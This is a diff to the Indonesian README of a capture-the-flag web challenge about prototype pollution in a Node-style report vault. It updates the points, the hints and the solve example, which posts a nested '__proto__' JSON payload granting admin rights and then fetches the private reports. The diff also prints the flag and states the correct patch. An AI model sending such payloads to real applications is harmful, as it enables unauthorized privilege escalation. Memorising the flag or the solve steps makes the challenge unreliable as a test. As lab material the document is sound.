@@ -2,7 +2,7 @@
 
 - Category: Web
 - Difficulty: Hard
-- Points: 300
+- Points: 400
 - Flag: `Olivia26{report_vault_polluted_access}`
 - Port internal: `8000`
 - Author: CTF Unesa
@@ -17,7 +17,9 @@ Temukan flag di laporan private.
 
 Fitur preference menerima JSON nested yang fleksibel.
 
-Tidak semua property object harus benar-benar dimiliki object itu sendiri.
+Perhatikan bagaimana recursive merge menangani key object yang punya perilaku khusus di JavaScript.
+
+Pengecekan akses membaca property user secara langsung; property lookup JavaScript tidak selalu berhenti di object itu sendiri.
 
 ## File Soal
 
@@ -27,6 +29,7 @@ Tidak semua property object harus benar-benar dimiliki object itu sendiri.
 - `flag.txt`: flag yang disalin ke `/flag.txt` di container
 - `solve.sh`: solver untuk verifikasi panitia
 - `challenge.yml`: metadata untuk platform CTF
+- `WRITEUP.md`: write-up, exploit path, dan evaluasi celah challenge
 
 ## Deploy Dengan Docker Compose
 
@@ -84,10 +87,9 @@ Contoh solve:
 curl -s -c jar.txt http://127.0.0.1:8003/ >/dev/null
 curl -s -b jar.txt -c jar.txt \
   -H 'content-type: application/json' \
-  -d '{"__proto__":{"role":"admin","canExportPrivate":true}}' \
+  -d '{"preferences":{"__proto__":{"role":"admin","canExportPrivate":true}}}' \
   http://127.0.0.1:8003/api/preferences
 curl -s -b jar.txt http://127.0.0.1:8003/reports/private
 ```
 
 Patch yang benar adalah menolak key `__proto__`, `constructor`, dan `prototype`, atau memakai merge library yang aman terhadap prototype pollution.
-
